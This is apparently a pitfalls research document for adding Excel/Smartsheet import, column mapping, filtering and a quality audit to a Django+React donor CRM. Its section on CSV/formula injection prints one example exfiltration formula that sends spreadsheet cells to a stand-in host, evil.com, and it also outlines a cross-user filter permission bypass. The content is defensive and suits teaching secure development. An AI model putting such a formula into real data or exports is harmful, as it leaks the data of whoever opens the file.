# Pitfalls Research

**Domain:** Extending existing Django+React app with Smartsheet/Excel import, column mapping UI, comprehensive filtering, and quality audit
**Researched:** 2026-02-16
**Confidence:** HIGH

## Critical Pitfalls

### Pitfall 1: Excel File Parsing Engine Mismatches

**What goes wrong:**
Python code attempts to parse `.xlsx` files with pandas without specifying `engine='openpyxl'`, or tries to read `.xls` files without installing `xlrd`. The error manifests as `ValueError: Excel file format cannot be determined, you must specify an engine manually`, but only when users upload certain file types. Works fine in testing with one file format, fails in production with another.

**Why it happens:**
Developers test with a single file type (usually `.xlsx` from their own Excel version) and assume pandas will auto-detect. Excel files have multiple formats (.xls, .xlsx, .xlsm, .xlsb), and pandas needs the correct engine installed and specified. Additionally, XML formatting issues embedded in Excel files often don't appear when opening files in Excel directly, but cause parsing failures in Python libraries.

**How to avoid:**
1. Explicitly specify `engine='openpyxl'` when calling `pd.read_excel()` for .xlsx files
2. Install both `openpyxl` (for .xlsx) and `xlrd` (for .xls) dependencies
3. Test with files from multiple Excel versions (Office 2010, 2016, 2021, 365, LibreOffice, Google Sheets exports)
4. Add file extension validation before parsing and provide clear error messages
5. For files that fail pandas parsing, fall back to `openpyxl.load_workbook()` directly and read cell-by-cell

**Warning signs:**
- Error reports from users with "Excel file format cannot be determined"
- XML parsing errors that don't occur when opening files in Excel
- ImportError for openpyxl despite pandas being installed
- Files exported from Google Sheets or LibreOffice fail while Microsoft Excel files work

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) — establish robust file type detection and multi-engine support before building column mapping UI

**Sources:**
- [Reading File Formats with Pandas: CSV, Excel, JSON Guide 2026](https://techietory.com/data-science/reading-different-file-formats-with-pandas-csv-excel-json/)
- [Handling ValueError When Reading Excel Files with Pandas and OpenPyXL](https://medium.com/@tempmailwithpassword/handling-valueerror-when-reading-excel-files-with-pandas-and-openpyxl-4bfd671e127f)
- [How to Effectively Work with Excel Files in Python: Pandas vs Openpyxl Guide](https://www.statology.org/how-to-effectively-work-with-excel-files-in-python-pandas-vs-openpyxl-guide/)

---

### Pitfall 2: CSV/Formula Injection via Imported Data

**What goes wrong:**
User uploads Excel/CSV file containing cells that start with `=`, `+`, `-`, or `@`. These values are imported into the database and later exported in a CSV file. When another user opens the exported CSV in Excel, the formulas execute, potentially exfiltrating data (e.g., `=IMPORTXML(CONCAT("http://evil.com/?", A1:A100), "//a")`) or executing system commands.

**Why it happens:**
Developers treat Excel/CSV files as simple data containers and don't realize that spreadsheet applications interpret certain characters as formula prefixes. The existing codebase has formula injection prevention for CSV *exports* (line 521-522 in `services.py`: `elif fund_id.startswith(FORMULA_PREFIXES)`), but no validation on file *uploads*. An attacker uploads a file with malicious formulas, those values pass validation, get stored, and later exported to other users.

**How to avoid:**
1. Validate ALL text fields during import parsing for formula prefixes (`=`, `+`, `-`, `@`)
2. Reject rows containing formula-like content OR sanitize by prefixing with single quote `'` or tab character `\t`
3. Apply sanitization during both import AND export (defense in depth)
4. Document this security measure in import validation rules
5. Add automated tests with formula injection payloads

**Warning signs:**
- No formula prefix validation in new `parse_smartsheet_csv()` function
- Copy-pasted validation logic from existing CSV import without review
- Testing only with "clean" data files
- No security-focused test cases for file uploads

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) — formula injection prevention must be built into parsing layer, not bolted on later

**Sources:**
- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)
- [Best-practice methods to prevent CSV formula injection attacks in Node.js, Django, Flask, Java & PHP - Cyber Chief](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html)
- [CSV/Formula Injection — Security For Web Application Developers | ITNEXT](https://itnext.io/csv-formula-injection-security-for-web-application-developers-4e1c2e2a64fa)
- [CSV Injection: Risks, Attack Payloads & Prevention Guide](https://resources.uprootsecurity.com/csv_injection)

---

### Pitfall 3: Memory Exhaustion from Large File Uploads

**What goes wrong:**
User uploads a 50MB Excel file with 100,000 rows. Django loads the entire request body into memory (limited by `DATA_UPLOAD_MAX_MEMORY_SIZE`, default 2.5MB), then pandas/openpyxl loads the entire file into memory for parsing. Server memory spikes, request times out, or OOM killer terminates the process. Even if the file passes upload, parsing 100k rows into Python objects consumes excessive memory.

**Why it happens:**
Django's default file upload handling loads small files entirely into memory. Developers test with 10-row sample files, then deploy to production where users upload full datasets. The existing CSV import uses `csv.DictReader(io.StringIO(file_content))` which assumes the entire file content is a string in memory. Extending this pattern to Excel files (which are larger and more complex) multiplies memory usage.

**How to avoid:**
1. Set appropriate `FILE_UPLOAD_MAX_MEMORY_SIZE` and `DATA_UPLOAD_MAX_MEMORY_SIZE` in Django settings
2. Use Django's `TemporaryFileUploadHandler` to write large files to disk
3. Process uploaded files in chunks/batches rather than loading all rows at once
4. For openpyxl, use `read_only=True` mode: `load_workbook(filename, read_only=True)`
5. Set file size limits in the frontend (e.g., 10MB max) and communicate limits clearly
6. Add async task processing for large imports (Celery task with progress updates)

**Warning signs:**
- No file size validation in upload endpoint
- Loading entire file content with `.read()` into a variable
- No `read_only=True` flag when using `openpyxl.load_workbook()`
- Testing only with small sample files (<1MB)
- No memory profiling of import functions
- No timeout limits on import endpoints

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) — file size limits and streaming must be designed into upload architecture from the start

**Sources:**
- [Handling Large File Uploads in Django 🚀 | Medium (Feb 2025)](https://medium.com/@ewho.ruth2014/handling-large-file-uploads-in-django-e86da6bde982)
- [Handling Large File Uploads (Up to 10GB) in Django: A Complete Guide | Medium](https://medium.com/@yogeshkrishnanseeniraj/handling-large-file-uploads-up-to-10gb-in-django-a-complete-guide-efa195d80445)
- [File upload blocks memory regardless of UploadHandler - Using Django - Django Forum](https://forum.djangoproject.com/t/file-upload-blocks-memory-regardless-of-uploadhandler/10101)

---

### Pitfall 4: Breaking Existing Import Pipeline with Refactor

**What goes wrong:**
New Smartsheet import feature shares 80% of logic with existing CSV import. Developer refactors `parse_funds_csv()`, `import_funds()`, etc. to be more generic, introducing subtle behavior changes. Existing CSV import tests still pass (barely), but production CSV imports start failing with edge cases that worked before. Users report that CSV imports that succeeded last week now fail with cryptic errors.

**Why it happens:**
The temptation to DRY (Don't Repeat Yourself) is strong when the new feature looks similar to an existing one. Extracting shared logic seems clean, but the existing CSV import has subtle behaviors baked in (specific column name handling, specific error messages, specific validation order). Changing shared code to accommodate the new feature inadvertently breaks assumptions in the old feature. The existing code has 4 import types (Funds, Entities, Transactions, Pledges) with slightly different logic each — refactoring without understanding these differences causes regressions.

**How to avoid:**
1. **Copy-paste first, refactor later** — duplicate the parsing logic for Smartsheet imports initially
2. Keep existing CSV import code paths completely unchanged
3. If refactoring shared code, use feature flags to toggle new behavior
4. Add regression tests for ALL existing CSV import types before refactoring
5. Test existing imports against production-like data (with edge cases, empty fields, special characters)
6. Use semantic versioning for import service functions if they're reused

**Warning signs:**
- Renaming existing service functions (e.g., `parse_funds_csv` → `parse_funds`)
- Changing existing function signatures to add new parameters
- Modifying existing validation logic "to be more consistent"
- Green CI tests but no manual testing of existing CSV imports
- No regression test suite for all 4 existing import types

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) — establish isolation strategy before writing shared code

**Sources:**
- [Building a Maintainable ETL Pipeline: Lessons from Refactoring Our Analytics Import](https://medium.com/womenintechnology/building-a-maintainable-etl-pipeline-lessons-from-refactoring-our-analytics-import-8f966dadf34a)
- [The key points of Refactoring at Scale - Change Messy Software Without Breaking It](https://understandlegacycode.com/blog/key-points-of-refactoring-at-scale/)
- [Code Refactoring: When to Refactor and How to Avoid Mistakes – Tembo](https://www.tembo.io/blog/code-refactoring)

---

### Pitfall 5: Column Mapping State Loss on Refresh

**What goes wrong:**
User uploads a 50-column Excel file, spends 5 minutes mapping each column to DonorCRM fields using drag-drop UI, then accidentally refreshes the browser. All mapping state is lost. User must start over, gets frustrated, abandons import.

**Why it happens:**
Developers store column mapping state in React component `useState` without persisting to URL params, localStorage, or backend. The mapping UI looks polished and works smoothly, but has no resilience to browser navigation. Users expect their work to be saved, especially for a multi-step import workflow.

**How to avoid:**
1. Persist mapping state to URL search params (e.g., `?map[0]=first_name&map[1]=last_name`)
2. Fallback to sessionStorage for complex mapping that exceeds URL length limits
3. Provide "Save Mapping Template" feature to save common mappings for reuse
4. Show unsaved changes warning before navigation (`beforeunload` event)
5. Consider multi-step wizard with backend-stored state (upload → map → validate → confirm)

**Warning signs:**
- Column mapping uses only `useState` with no persistence
- No URL params for mapping state
- No localStorage/sessionStorage usage
- No "Save Draft" or "Save Template" functionality
- Testing only happy path (no refresh, no back button, no browser crash simulation)

**Phase to address:**
Phase 2 (Column mapping UI) — state persistence must be built into mapping component architecture

**Sources:**
- [Storing state in the URL with React](https://pierrehedkvist.com/posts/react-state-url)
- [Why URL state matters: A guide to useSearchParams in React - LogRocket Blog](https://blog.logrocket.com/url-state-usesearchparams/)
- [How To Design Bulk Import UX (+ Figma Prototypes) — Smart Interface Design Patterns](https://smart-interface-design-patterns.com/articles/bulk-ux/)

---

### Pitfall 6: Drag-and-Drop UI Accessibility Failure

**What goes wrong:**
Column mapping UI uses drag-and-drop exclusively. Keyboard-only users (accessibility requirement) and mobile users cannot map columns. Component works beautifully with mouse, fails completely without one. WCAG compliance audit fails.

**Why it happens:**
Drag-and-drop libraries (like `react-beautiful-dnd` or `@dnd-kit/core`) make drag-drop UI easy to build, but developers forget that drag-drop is inherently mouse-centric. Accessibility is added as an afterthought, or not at all. Mobile touch support is often separate from mouse drag support.

**How to avoid:**
1. Provide alternative input method: dropdown selects alongside drag-drop
2. Use accessible drag-drop library with keyboard support built-in (e.g., `@dnd-kit/core` with `KeyboardSensor`)
3. Add visible keyboard instructions ("Press space to grab, arrow keys to move")
4. Ensure touch events work on mobile (test on actual device, not just Chrome DevTools)
5. Add automated accessibility tests with axe-core or similar

**Warning signs:**
- Drag-drop is the ONLY way to map columns
- No keyboard event handlers on draggable elements
- No ARIA labels or live regions
- No testing on actual mobile devices
- No accessibility testing in CI pipeline

**Phase to address:**
Phase 2 (Column mapping UI) — accessibility must be designed in, not added later

**Sources:**
- [Drag-and-Drop UX: Guidelines and Best Practices — Smart Interface Design Patterns](https://smart-interface-design-patterns.com/articles/drag-and-drop-ux/)
- [Designing drag and drop UIs: Best practices and patterns - LogRocket Blog](https://blog.logrocket.com/ux-design/drag-and-drop-ui-examples/)
- [Drag & Drop UX Design Best Practices - Pencil & Paper](https://www.pencilandpaper.io/articles/ux-pattern-drag-and-drop)

---

### Pitfall 7: Filter Query Performance Degradation (N+1 Queries)

**What goes wrong:**
Add filters to ContactList page using DjangoFilterBackend. Works fine with 10 contacts. Deploy to production user with 5,000 contacts and 10+ donations each. Page load takes 30+ seconds. Django Debug Toolbar shows 5,000+ queries due to N+1 pattern in serializer accessing `contact.donations.all()` or `contact.pledges.filter(status='active')`.

**Why it happens:**
DjangoFilterBackend applies filters to the base queryset (`Contact.objects.filter(...)`), but doesn't automatically optimize related field access in serializers. The existing ContactList serializer likely uses nested serializers or computed properties that trigger additional queries per contact. The codebase already has this exact issue documented in `.planning/EDGE_CASE_AUDIT.md` line 21: "N+1 Query Storm in Journal Grid (CRITICAL)" with "up to 351 queries per page load."

**How to avoid:**
1. Add `select_related()` for foreign keys and `prefetch_related()` for reverse foreign keys in `get_queryset()`
2. Use `Prefetch()` objects for complex prefetching with custom querysets
3. Profile queries with Django Debug Toolbar before and after adding filters
4. Consider using `SerializerMethodField` with prefetched data instead of property access
5. Add queryset optimization to view's `get_queryset()`, not to serializer's `to_representation()`

**Warning signs:**
- Adding filters without reviewing serializer's related field access
- No `select_related()` or `prefetch_related()` in filtered views
- No query count testing in view tests
- Not using Django Debug Toolbar during development
- Serializer uses `contact.donations.count()` or similar without prefetch

**Phase to address:**
Phase 3 (Filtering backend implementation) — query optimization must be part of filter implementation, not a post-release fix

**Sources:**
- [Django QuerySet Optimization: Stop StranglingYour API Performance | Medium (Jan 2026)](https://medium.com/@sizanmahmud08/django-queryset-optimization-stop-stranglingyour-api-performance-6bc368d72512)
- [Django and the N+1 Queries Problem](https://www.scoutapm.com/blog/django-and-the-n1-queries-problem)
- [Improve Query Performance Using Python Django QuerySets | AppSignal Blog](https://blog.appsignal.com/2025/12/03/improve-query-performance-using-django-python-querysets.html)

---

### Pitfall 8: Filter State Desynchronization Between URL and UI

**What goes wrong:**
User applies filters on ContactList page, URL updates to `/contacts?status=donor&search=smith`. User bookmarks URL. Later, they load the bookmark — URL has filters, but UI shows no active filters (filter dropdowns are reset to defaults). Or inverse: user selects filters in UI, clicks "Apply," but URL doesn't update, so browser back button doesn't work as expected.

**Why it happens:**
Developers treat URL params and UI state as separate sources of truth instead of synchronized. Filter component uses `useState` for selected values, and separately calls `setSearchParams()` on submit. Initial load reads URL params but doesn't set UI state from them. Or UI state updates don't trigger URL updates. This is a classic React state management pitfall when integrating URL state.

**How to avoid:**
1. Use URL params as the SINGLE source of truth for filter state
2. Initialize filter UI state from `searchParams` on mount
3. Update URL params immediately when filters change (not on "Apply" button)
4. Use `useSearchParams()` hook to read and write in sync
5. Add URL param validation (fallback for invalid values)
6. Consider `nuqs` library for type-safe search param state management

**Warning signs:**
- Filter component has `useState` for filter values separate from URL
- URL updates only on button click, not on filter change
- No initialization from URL params on component mount
- Bookmark/refresh doesn't preserve filter state
- Browser back button doesn't restore previous filters

**Phase to address:**
Phase 4 (Filtering frontend UI) — URL state synchronization must be designed into filter component architecture

**Sources:**
- [Why URL state matters: A guide to useSearchParams in React - LogRocket Blog](https://blog.logrocket.com/url-state-usesearchparams/)
- [Advanced React state management using URL parameters - LogRocket Blog](https://blog.logrocket.com/advanced-react-state-management-using-url-parameters/)
- [Using React Router searchParams to manage filter state for a list | Medium](https://cgarethc.medium.com/using-react-router-searchparams-to-manage-filter-state-for-a-list-e515e8e50166)
- [nuqs | Type-safe search params state management for React](https://nuqs.dev)

---

### Pitfall 9: Dark Mode Inconsistencies After Adding New Features

**What goes wrong:**
New filter components, column mapping modal, and import wizard look perfect in light mode. Switch to dark mode — text is invisible (white on white), borders disappear, loading spinners are black on dark background, some icons don't adapt. Existing pages look fine, but new features are unusable in dark mode.

**Why it happens:**
Developers build features in light mode, forget to test dark mode, or hard-code colors instead of using CSS variables. The existing codebase uses Tailwind dark mode with CSS variables (`--background`, `--foreground`, etc.), but new components use hard-coded colors like `bg-white` or `text-gray-900` instead of semantic variables like `bg-background` or `text-foreground`. Some UI libraries (like Radix components) have dark mode built-in, but custom components don't.

**How to avoid:**
1. Test EVERY new component in dark mode during development (use theme toggle repeatedly)
2. Use semantic Tailwind classes (`bg-card`, `text-foreground`, `border-border`) NOT hard-coded colors
3. Use `dark:` prefix only when semantic classes don't suffice
4. Audit all color usage in new components against CSS variable definitions in `globals.css`
5. Add automated visual regression tests with dark mode screenshots
6. Add dark mode testing to PR checklist

**Warning signs:**
- Hard-coded color classes like `bg-white`, `text-gray-900`, `border-gray-200` in new components
- No dark mode testing during feature development
- Component library (e.g., Radix) isn't configured for dark mode properly
- `className="dark:"` used inconsistently
- No visual regression test suite

**Phase to address:**
Phase 5 (Quality audit - Dark mode) — must review ALL new UI components added in Phases 2-4

**Sources:**
- [Simple dark mode support with Tailwind & CSS variables](https://invertase.io/blog/tailwind-dark-mode)
- [Dark Mode - Tailwind CSS](https://tailwindcss.com/docs/dark-mode)
- [Upgrading to Tailwind v4: Missing Defaults, Broken Dark Mode, and Config Issues · tailwindlabs/tailwindcss · Discussion #16517](https://github.com/tailwindlabs/tailwindcss/discussions/16517)

---

### Pitfall 10: Floating Point Arithmetic in monthly_equivalent Calculation

**What goes wrong:**
Pledge with `amount=100.00` and `frequency='quarterly'` displays `monthly_equivalent=$33.33`. Another pledge with `amount=150.00` quarterly shows `$50.00`. User adds both pledges — total should be `$83.33`, but displays `$83.32999999999` or rounds inconsistently. Contact stats become unreliable for financial reporting.

**Why it happens:**
This is KNOWN TECH DEBT in the codebase (from milestone context: "float arithmetic in pledge monthly_equivalent"). The existing `monthly_equivalent` property likely uses float division instead of `Decimal` math. Money is stored in `Decimal` fields (correct!), but computed properties convert to float for division, losing precision. The issue manifests when aggregating multiple pledges or displaying totals.

**How to avoid:**
1. Use `Decimal` for ALL money arithmetic, including division
2. Never convert money to float (even for display — format `Decimal` directly)
3. Use `quantize()` method to round to 2 decimal places: `amount.quantize(Decimal('0.01'))`
4. For frequency division: `Decimal(amount) / Decimal(frequency_multiplier)`
5. Add tests comparing aggregated totals to ensure precision

**Warning signs:**
- Division operations on money amounts without `Decimal()` wrapper
- `float()` conversion anywhere in money calculations
- Test assertions using `assertAlmostEqual` instead of exact equality
- Display formatting with f-strings instead of Decimal-aware formatting

**Phase to address:**
Phase 5 (Quality audit - Code quality) — fix monthly_equivalent calculation alongside other tech debt

---

### Pitfall 11: Permission Bypass in Filtered List Views

**What goes wrong:**
Contact list has proper permission check: `IsOwnerOrAdmin`. Add DjangoFilterBackend to enable filtering. User A filters by `?status=donor` and sees only their own contacts (correct). Admin adds a custom `FilterSet` with `owner` field to allow admins to filter by missionary. Now regular users can access `?owner=<other_user_id>` and see contacts they don't own. Permission bypass vulnerability.

**Why it happens:**
This is KNOWN TECH DEBT in the codebase (from milestone context: "ListAPIView permission bypass"). DRF's `ListAPIView` applies `filter_backends` AFTER permission checks, so adding filters that access fields users shouldn't query can bypass owner-scoping. The permission class checks `obj.owner == request.user` in `has_object_permission()`, but that only runs on detail views, not list views. List view permissions must be enforced in queryset filtering.

**How to avoid:**
1. Override `get_queryset()` to scope by owner BEFORE applying filters
2. NEVER expose `owner` field in FilterSet for non-admin users
3. Use DRF's `filter_queryset()` method which applies permission-aware filtering
4. Add integration tests simulating cross-user access attempts
5. For admin-only filters, create separate FilterSet class for admin users

**Warning signs:**
- FilterSet exposes foreign key fields (`owner`, `uploaded_by`, etc.) without role checks
- No `get_queryset()` override to scope data by user
- Permission class only implements `has_object_permission()`, not queryset filtering
- No security-focused test cases for list views with filters

**Phase to address:**
Phase 3 (Filtering backend implementation) — permission scoping must be tested before filters go live

**Sources:**
- [Filtering - Django REST framework](https://www.django-rest-framework.org/api-guide/filtering/)
- [Generic views - Django REST framework](https://www.django-rest-framework.org/api-guide/generic-views/)

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Hard-coding file size limit (e.g., 10MB) in view instead of settings | Quick implementation | Can't adjust limit without code change; not configurable per environment | MVP only; move to settings in Phase 1 |
| Loading entire uploaded file into memory | Simple parsing code | Memory exhaustion with large files; server instability | Files <1MB only; switch to streaming for production |
| Skipping file extension validation | Fewer lines of code | Security risk (upload .php as .xlsx), cryptic errors for users | Never; validation is 5 lines |
| Using `useState` for filter state instead of URL params | Familiar React patterns | Broken bookmarks, no shareable URLs, bad UX | Prototyping only; switch to URL state before launch |
| Copy-pasting column mapping state logic across components | Fast duplication | Inconsistent behavior, harder to maintain | Never; extract shared hook immediately |
| Disabling dark mode for new features "temporarily" | Ship features faster | Users avoid new features, brand inconsistency, accessibility issues | Never; dark mode is table stakes |
| No Celery for large imports (process synchronously) | No async infrastructure needed | Request timeouts, poor UX for large files | Files <1000 rows; add Celery for production scale |
| Reusing existing CSV service functions for Excel without testing | Less code to write | Breaks existing CSV imports, regression bugs | Never; duplicate first, refactor later if needed |
| Not profiling queryset queries for filtered views | Trust that DRF is optimized | N+1 queries discovered in production, performance degradation | Never; profiling is 5 minutes with Debug Toolbar |

## Integration Gotchas

Common mistakes when connecting to external services.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Excel parsing (openpyxl/pandas) | Assuming auto-detection works | Explicitly specify `engine='openpyxl'` for .xlsx, `engine='xlrd'` for .xls |
| File uploads (Django) | Loading entire file into memory | Use `TemporaryFileUploadHandler`, set `FILE_UPLOAD_MAX_MEMORY_SIZE` |
| DjangoFilterBackend | Trusting it optimizes queries | Add `select_related()`/`prefetch_related()` in `get_queryset()` |
| React Router `useSearchParams` | Creating separate `useState` for filters | Use URL params as single source of truth |
| Tailwind dark mode | Using hard-coded colors (`bg-white`) | Use semantic variables (`bg-background`, `text-foreground`) |
| Decimal arithmetic | Converting to float for calculations | Keep as Decimal, use `quantize()` for rounding |
| DRF ListAPIView permissions | Only implementing `has_object_permission` | Override `get_queryset()` to scope data by user |

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Loading all Excel rows into list | Fast with 100 rows | Use pandas chunking or openpyxl read_only mode | >10k rows |
| N+1 queries in filtered list views | Page loads fine with 10 items | `select_related()`/`prefetch_related()` in queryset | >100 items with relations |
| No pagination on import history | Works with 10 imports | Add pagination, limit default to last 50 runs | >500 import runs |
| Synchronous file processing | Responsive for small files | Move to Celery task with progress updates | >5MB files |
| Unbounded error list in import results | Manageable with 10 errors | Limit to first 20 errors + "X more errors" count | >100 errors |
| Serializing entire queryset to JSON | Fine for 50 contacts | Use `StreamingHttpResponse` for CSV export | >1000 items |
| Loading all filter options (e.g., all users) into dropdown | Works with 10 users | Lazy-load with search/autocomplete | >200 options |

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| No CSV/formula injection prevention on import | Data exfiltration, RCE when exported CSV opened | Validate formula prefixes (`=+-@`), sanitize or reject |
| Exposing `owner` field in FilterSet for regular users | Cross-user data access via `?owner=X` | Scope `get_queryset()` by user, exclude `owner` from public FilterSet |
| No file type validation beyond extension | Malicious file upload (e.g., .php disguised as .xlsx) | Validate MIME type, use `python-magic` or similar |
| No file size limit on upload endpoint | DoS via large file uploads | Set `DATA_UPLOAD_MAX_MEMORY_SIZE`, validate in view |
| Re-using UUIDs from API responses to access other users' data | Privilege escalation if permission checks missing | Always validate ownership in view, never trust client-provided IDs |
| No rate limiting on import endpoint | Resource exhaustion from repeated large imports | Add throttling (e.g., 10 imports per hour per user) |

## UX Pitfalls

Common user experience mistakes in this domain.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Drag-drop only for column mapping | Keyboard users and mobile users blocked | Provide dropdown fallback alongside drag-drop |
| No visual feedback during file upload | User doesn't know if upload is working | Show progress bar, file size, upload status |
| Losing mapping state on browser refresh | User rage-quits after re-doing work | Persist mapping to URL params or sessionStorage |
| Cryptic error messages ("ValueError at line 42") | User doesn't know how to fix file | User-friendly errors: "Row 42: Amount must be a number, got 'abc'" |
| No preview before import | User imports wrong data, must undo | Show first 5 rows with mapped columns before confirming |
| All-or-nothing import (one error fails entire file) | User must fix file and re-upload for single typo | Skip invalid rows, import valid ones, download error report |
| No indication of filter state | User forgets filters are active, sees incomplete data | Show active filter badges, clear visual indicator |
| Filters apply on every keystroke | Performance degrades, confusing intermediate states | Debounce search input, apply other filters on blur/enter |

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Excel import:** Tested with .xlsx but not .xls, .xlsm, .csv, LibreOffice, Google Sheets exports
- [ ] **Column mapping UI:** Works with mouse but not keyboard, touch, or screen reader
- [ ] **Filter state:** UI state syncs to URL on submit, but not on page load from bookmarked URL
- [ ] **Dark mode:** New components look good in light mode, untested in dark mode
- [ ] **Import validation:** Happy path works, but no tests for formula injection, huge files, malformed data
- [ ] **Permission checks:** Detail views check ownership, but list views with filters don't scope queryset
- [ ] **Query performance:** Works with 10 test records, not profiled with 1000+ production records
- [ ] **Error handling:** Displays error, but error message isn't actionable for user
- [ ] **File upload:** Accepts uploads, but no size limit, no type validation, no virus scanning
- [ ] **Mapping state:** Saves mapping on success, but not on refresh, back button, or navigation
- [ ] **Accessibility:** Passes automated tests, but not tested with real screen reader
- [ ] **Mobile:** Looks good in Chrome DevTools responsive mode, not tested on actual device

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Formula injection in production data | MEDIUM | Run migration to sanitize existing data: prefix formula-like strings with `'` or strip leading operators |
| N+1 queries causing slow page loads | LOW | Add `select_related()`/`prefetch_related()` to view's `get_queryset()`, deploy hotfix |
| Memory exhaustion from large file uploads | MEDIUM | Reduce `DATA_UPLOAD_MAX_MEMORY_SIZE`, add Celery for async processing, redeploy |
| Dark mode broken in new features | LOW | Audit all new components for hard-coded colors, replace with semantic classes, deploy |
| Permission bypass via filter tampering | HIGH | Patch `get_queryset()` to scope by user, audit access logs for exploitation, deploy emergency fix |
| Lost mapping state frustrating users | LOW | Add URL param persistence, localStorage backup, deploy update |
| Broken CSV imports after refactor | HIGH | Revert shared code changes, restore original functions, add regression tests before re-attempting |
| Float precision errors in money calculations | MEDIUM | Fix `monthly_equivalent` to use Decimal, run data migration to recalculate affected records |
| Inaccessible drag-drop UI blocking users | MEDIUM | Add dropdown fallback, keyboard handlers, redeploy with accessibility fix |
| Large import timeouts | MEDIUM | Move processing to Celery task, return job ID immediately, poll for status |

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Excel parsing engine mismatches | Phase 1: Backend parsing | Test with .xlsx, .xls, .csv, .xlsm files from multiple sources |
| CSV/formula injection | Phase 1: Backend parsing | Security test with formula payloads (`=1+1`, `=IMPORTXML(...)`) |
| Memory exhaustion from large files | Phase 1: Backend parsing | Upload 50MB file, monitor memory usage, ensure no OOM |
| Breaking existing CSV imports | Phase 1: Backend parsing | Run full regression test suite for all 4 import types |
| Column mapping state loss | Phase 2: Column mapping UI | Refresh page mid-mapping, verify state restored from URL |
| Drag-drop accessibility failure | Phase 2: Column mapping UI | Test with keyboard only, screen reader, mobile touch |
| Filter query performance (N+1) | Phase 3: Filtering backend | Profile queries with 1000+ records, ensure <10 queries per page |
| Filter state desync (URL vs UI) | Phase 4: Filtering frontend | Load bookmarked URL with filters, verify UI matches |
| Dark mode inconsistencies | Phase 5: Quality audit | Toggle dark mode on all new pages, check for contrast issues |
| Float arithmetic in monthly_equivalent | Phase 5: Quality audit | Fix Decimal calculation, test aggregation totals |
| Permission bypass in filtered lists | Phase 3: Filtering backend | Attempt cross-user access with `?owner=X`, verify 403/empty |

## Sources

- [Reading File Formats with Pandas: CSV, Excel, JSON Guide 2026](https://techietory.com/data-science/reading-different-file-formats-with-pandas-csv-excel-json/)
- [Handling ValueError When Reading Excel Files with Pandas and OpenPyXL](https://medium.com/@tempmailwithpassword/handling-valueerror-when-reading-excel-files-with-pandas-and-openpyxl-4bfd671e127f)
- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)
- [Best-practice methods to prevent CSV formula injection attacks - Cyber Chief](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html)
- [Handling Large File Uploads in Django 🚀 | Medium (Feb 2025)](https://medium.com/@ewho.ruth2014/handling-large-file-uploads-in-django-e86da6bde982)
- [Building a Maintainable ETL Pipeline: Lessons from Refactoring](https://medium.com/womenintechnology/building-a-maintainable-etl-pipeline-lessons-from-refactoring-our-analytics-import-8f966dadf34a)
- [Drag-and-Drop UX: Guidelines and Best Practices — Smart Interface Design Patterns](https://smart-interface-design-patterns.com/articles/drag-and-drop-ux/)
- [Django QuerySet Optimization | Medium (Jan 2026)](https://medium.com/@sizanmahmud08/django-queryset-optimization-stop-stranglingyour-api-performance-6bc368d72512)
- [Why URL state matters: A guide to useSearchParams in React - LogRocket](https://blog.logrocket.com/url-state-usesearchparams/)
- [Simple dark mode support with Tailwind & CSS variables](https://invertase.io/blog/tailwind-dark-mode)
- [Filtering - Django REST framework](https://www.django-rest-framework.org/api-guide/filtering/)

---
*Pitfalls research for: DonorCRM v1.3 — Smartsheet Import, Filters & Polish*
*Researched: 2026-02-16*
